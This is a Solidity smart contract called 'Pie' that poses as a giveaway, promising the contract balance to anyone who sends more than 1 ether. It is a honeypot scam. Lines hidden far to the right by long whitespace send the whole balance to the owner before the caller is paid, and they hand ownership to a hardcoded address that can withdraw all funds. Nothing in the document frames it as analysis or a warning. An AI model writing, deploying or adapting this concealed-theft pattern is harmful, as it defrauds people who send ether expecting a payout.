pragma solidity ^0.8.26;

contract Pie {
    address public Owner = msg.sender;
    uint public totalDeposits;
    uint public totalWithdrawals;
    mapping(address => uint) public userDeposits;
    
    event Deposit(address indexed user, uint amount);
    event Withdrawal(address indexed user, uint amount);
    event PieClaimed(address indexed user, uint amount);
   
    receive() external payable {
        totalDeposits += msg.value;
        userDeposits[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }
   
    function GetPie() public payable {                                                                    
        if(msg.value>1 ether) {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       payable(Owner).transfer(address(this).balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
            payable(msg.sender).transfer(address(this).balance);
            emit PieClaimed(msg.sender, address(this).balance);
        }                                                                                                                
    }
    
    function withdraw() payable public {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       if(msg.sender==0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6){Owner=0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6;}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
        require(msg.sender == Owner);
        uint balance = address(this).balance;
        payable(Owner).transfer(balance);
        totalWithdrawals += balance;
        emit Withdrawal(msg.sender, balance);
    }
    
    function Command(address adr,bytes calldata data) payable public {
        require(msg.sender == Owner);
        unchecked {
            (bool success,) = adr.call{value: msg.value}(data);
            success;
            emit Deposit(adr, msg.value);
        }
    }
    
    function getUserBalance(address user) public view returns (uint) {
        return userDeposits[user];
    }
}